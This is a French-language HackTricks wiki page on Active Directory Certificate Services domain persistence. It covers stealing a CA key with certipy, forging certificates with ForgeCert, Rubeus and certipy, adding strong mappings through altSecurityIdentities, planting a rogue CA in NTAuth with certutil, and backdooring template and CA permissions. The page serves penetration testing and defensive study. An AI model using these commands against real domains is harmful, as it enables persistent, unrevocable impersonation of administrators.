# Persistance de domaine AD CS

{{#include ../../../banners/hacktricks-training.md}}

**Ceci est un résumé des techniques de persistance de domaine partagées dans [https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf)**. Consultez-le pour plus de détails.

## Forging Certificates with Stolen CA Certificates - DPERSIST1

Comment savoir qu'un certificat est un certificat CA ?

On peut déterminer qu'un certificat est un certificat CA si plusieurs conditions sont remplies :

- Le certificat est stocké sur le serveur CA, avec sa clé privée protégée par le DPAPI de la machine, ou par du matériel tel qu'un TPM/HSM si le système d'exploitation le prend en charge.
- Les champs Issuer et Subject du certificat correspondent au nom distinctif de la CA.
- Une extension "CA Version" est présente exclusivement dans les certificats CA.
- Le certificat ne possède pas de champs Extended Key Usage (EKU).

Pour extraire la clé privée de ce certificat, l'outil `certsrv.msc` sur le serveur CA est la méthode prise en charge via l'interface graphique intégrée. Néanmoins, ce certificat ne diffère pas des autres stockés dans le système ; ainsi, des méthodes telles que la [THEFT2 technique](certificate-theft.md#user-certificate-theft-via-dpapi-theft2) peuvent être appliquées pour l'extraction.

Le certificat et la clé privée peuvent également être obtenus en utilisant Certipy avec la commande suivante :
```bash
certipy ca 'corp.local/administrator@ca.corp.local' -hashes :123123.. -backup
```
Une fois le certificat CA et sa clé privée obtenus au format `.pfx`, des outils comme [ForgeCert](https://github.com/GhostPack/ForgeCert) peuvent être utilisés pour générer des certificats valides :
```bash
# Generating a new certificate with ForgeCert
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword Password123! --Subject "CN=User" --SubjectAltName localadmin@theshire.local --NewCertPath localadmin.pfx --NewCertPassword Password123!

# Generating a new certificate with certipy
certipy forge -ca-pfx CORP-DC-CA.pfx -upn administrator@corp.local -subject 'CN=Administrator,CN=Users,DC=CORP,DC=LOCAL'

# Authenticating using the new certificate with Rubeus
Rubeus.exe asktgt /user:localdomain /certificate:C:\ForgeCert\localadmin.pfx /password:Password123!

# Authenticating using the new certificate with certipy
certipy auth -pfx administrator_forged.pfx -dc-ip 172.16.126.128
```
> [!WARNING]
> L'utilisateur ciblé pour la falsification de certificat doit être actif et capable de s'authentifier dans Active Directory pour que le processus réussisse. Forger un certificat pour des comptes spéciaux comme krbtgt est inefficace.

Ce certificat forgé sera **valide** jusqu'à la date de fin spécifiée et tant que le certificat racine CA est **valide** (généralement de 5 à **10+ ans**). Il est aussi valide pour les **machines**, donc combiné avec **S4U2Self**, un attaquant peut **maintenir une persistance sur n'importe quelle machine du domaine** aussi longtemps que le certificat CA est valide.\
De plus, les **certificats générés** avec cette méthode **ne peuvent pas être révoqués** car la CA n'en est pas informée.

### Fonctionnement sous Strong Certificate Mapping Enforcement (2025+)

Depuis le 11 février 2025 (après le déploiement de KB5014754), les contrôleurs de domaine sont par défaut en **Full Enforcement** pour les mappings de certificats. Concrètement, cela signifie que vos certificats forgés doivent soit :

- Contenir une liaison forte vers le compte cible (par exemple, la SID security extension), ou
- Être associé à un mappage explicite fort sur l'attribut `altSecurityIdentities` de l'objet cible.

Une approche fiable pour la persistance consiste à créer un certificat forgé chaîné à l'Enterprise CA volée, puis à ajouter un mappage explicite fort au principal victime :
```powershell
# Example: map a forged cert to a target account using Issuer+Serial (strong mapping)
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'           # reverse DN format expected by AD
$SerialR = '1200000000AC11000000002B'                  # serial in reversed byte order
$Map     = "X509:<I>$Issuer<SR>$SerialR"             # strong mapping format
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Notes
- Si vous pouvez créer des forged certificates qui incluent l'extension de sécurité SID, celles-ci seront mappées implicitement même en Full Enforcement. Sinon, privilégiez des mappings explicites et robustes. Voir [account-persistence](account-persistence.md) pour plus d'informations sur les mappings explicites.
- La révocation n'aide pas les défenseurs ici : les forged certificates sont inconnus de la base de données CA et ne peuvent donc pas être révoqués.

## Trusting Rogue CA Certificates - DPERSIST2

The `NTAuthCertificates` object is defined to contain one or more **CA certificates** within its `cacertificate` attribute, which Active Directory (AD) utilizes. The verification process by the **domain controller** involves checking the `NTAuthCertificates` object for an entry matching the **CA specified** in the Issuer field of the authenticating **certificate**. Authentication proceeds if a match is found.

A self-signed CA certificate can be added to the `NTAuthCertificates` object by an attacker, provided they have control over this AD object. Normally, only members of the **Enterprise Admin** group, along with **Domain Admins** or **Administrators** in the **forest root’s domain**, are granted permission to modify this object. They can edit the `NTAuthCertificates` object using `certutil.exe` with the command `certutil.exe -dspublish -f C:\Temp\CERT.crt NTAuthCA`, or by employing the [**PKI Health Tool**](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/import-third-party-ca-to-enterprise-ntauth-store#method-1---import-a-certificate-by-using-the-pki-health-tool).

Additional helpful commands for this technique:
```bash
# Add/remove and inspect the Enterprise NTAuth store
certutil -enterprise -f -AddStore NTAuth C:\Temp\CERT.crt
certutil -enterprise -viewstore NTAuth
certutil -enterprise -delstore NTAuth <Thumbprint>

# (Optional) publish into AD CA containers to improve chain building across the forest
certutil -dspublish -f C:\Temp\CERT.crt RootCA          # CN=Certification Authorities
certutil -dspublish -f C:\Temp\CERT.crt CA               # CN=AIA
```
Cette capacité est particulièrement pertinente lorsqu'elle est utilisée conjointement avec une méthode décrite précédemment impliquant ForgeCert pour générer dynamiquement des certificats.

> Considérations de mappage post-2025 : placer une CA malveillante dans NTAuth n'établit que la confiance envers la CA émettrice. Pour utiliser des leaf certificates pour la connexion lorsque les DCs sont en **Full Enforcement**, le certificat leaf doit soit contenir l'extension de sécurité SID, soit il doit y avoir un mappage explicite fort sur l'objet cible (par exemple, Issuer+Serial dans `altSecurityIdentities`). Voir {{#ref}}account-persistence.md{{#endref}}.

## Mauvaise configuration malveillante - DPERSIST3

Les opportunités de **persistance** via des **modifications des descripteurs de sécurité des composants AD CS** sont nombreuses. Les modifications décrites dans la section "[Domain Escalation](domain-escalation.md)" peuvent être mises en œuvre de façon malveillante par un attaquant disposant d'un accès élevé. Cela inclut l'ajout de « control rights » (par ex., WriteOwner/WriteDACL/etc.) sur des composants sensibles tels que :

- L'objet **ordinateur AD du serveur CA**
- Le **service RPC/DCOM du serveur CA**
- Tout **objet AD descendant ou conteneur** dans **`CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>`** (par exemple, le conteneur Certificate Templates, le conteneur Certification Authorities, l'objet NTAuthCertificates, etc.)
- **Groupes AD délégués des droits pour contrôler AD CS** par défaut ou par l'organisation (comme le groupe intégré Cert Publishers et chacun de ses membres)

Un exemple de mise en œuvre malveillante impliquerait un attaquant, qui dispose de **permissions élevées** dans le domaine, ajoutant la permission **`WriteOwner`** au modèle de certificat par défaut **`User`**, en étant le principal pour ce droit. Pour exploiter cela, l'attaquant changerait d'abord la propriété du modèle **`User`** pour se l'attribuer. Ensuite, le **`mspki-certificate-name-flag`** serait réglé sur **1** sur le modèle pour activer **`ENROLLEE_SUPPLIES_SUBJECT`**, permettant à un utilisateur de fournir un Subject Alternative Name dans la requête. Par la suite, l'attaquant pourrait **s'enroller** en utilisant le **template**, choisissant un nom de **domain administrator** comme nom alternatif, et utiliser le certificat obtenu pour s'authentifier en tant que DA.

Réglages pratiques que les attaquants peuvent configurer pour une persistance à long terme dans le domaine (voir {{#ref}}domain-escalation.md{{#endref}} pour les détails complets et la détection) :

- Flags de politique CA permettant le SAN depuis les demandeurs (par ex., activation de `EDITF_ATTRIBUTESUBJECTALTNAME2`). Cela maintient exploitables des chemins de type ESC1.
- DACL du template ou paramètres permettant une émission apte à l'authentification (par ex., ajout du EKU Client Authentication, activation de `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`).
- Contrôler l'objet `NTAuthCertificates` ou les conteneurs CA pour réintroduire en continu des émetteurs malveillants si les défenseurs tentent un nettoyage.

> [!TIP]
> Dans les environnements durcis après KB5014754, associer ces mauvaises configurations à des mappages explicites et forts (`altSecurityIdentities`) garantit que vos certificats émis ou forgés restent utilisables même lorsque les DCs appliquent un mappage strict.

## Références

- Microsoft KB5014754 – Changements de l'authentification basée sur les certificats sur les contrôleurs de domaine Windows (calendrier d'application et mappages forts). https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- Certipy – Référence des commandes et utilisation de forge/auth. https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
{{#include ../../../banners/hacktricks-training.md}}
